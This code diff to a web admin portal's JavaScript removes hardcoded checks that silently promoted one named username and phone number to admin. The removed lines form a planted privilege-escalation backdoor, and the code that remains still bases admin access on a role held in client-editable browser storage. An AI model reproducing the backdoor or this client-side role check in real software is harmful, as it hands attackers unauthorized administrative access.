@@ -397,7 +397,6 @@ function switchAdminTab(moduleKey) {
     try {
       const u = JSON.parse(sessionStorage.getItem('sb_current_user') || localStorage.getItem('sb_current_user') || '{}');
       if (u.role) currentPortalRole = u.role;
-      if (u.username === 'vxyen0801') currentPortalRole = 'admin';
     } catch(e) {}
   }
 
@@ -534,18 +533,9 @@ document.addEventListener('DOMContentLoaded', () => {
     }
   } catch (e) {}
 
-  if (localUser && (localUser.username === 'vxyen0801' || localUser.phone === '0352313548')) {
-    localUser.role = 'admin';
-    try {
-      sessionStorage.setItem('sb_current_user', JSON.stringify(localUser));
-      localStorage.setItem('sb_current_user', JSON.stringify(localUser));
-      window.sb_current_user = localUser;
-    } catch (e) {}
-  }
-
   const isAllowedAdmin = Boolean(
-    (localUser && (['admin', 'manager', 'staff'].includes(localUser.role) || localUser.username === 'vxyen0801' || localUser.phone === '0352313548')) ||
-    (window.sb_current_user && (['admin', 'manager', 'staff'].includes(window.sb_current_user.role) || window.sb_current_user.username === 'vxyen0801' || window.sb_current_user.phone === '0352313548'))
+    (localUser && ['admin', 'manager', 'staff'].includes(localUser.role)) ||
+    (window.sb_current_user && ['admin', 'manager', 'staff'].includes(window.sb_current_user.role))
   );
 
   const subEl = document.getElementById('admin-module-subtitle');
@@ -568,9 +558,6 @@ document.addEventListener('DOMContentLoaded', () => {
     .then(data => {
       if (data && data.csrf_token) {
         setAdminCsrfToken(data.csrf_token);
-      }
-      if (data && data.user && (data.user.username === 'vxyen0801' || data.user.phone === '0352313548')) {
-        data.user.role = 'admin';
       }
       if (data && data.success && data.logged_in && data.user && ['admin', 'manager', 'staff'].includes(data.user.role)) {
         currentPortalRole = data.user.role;
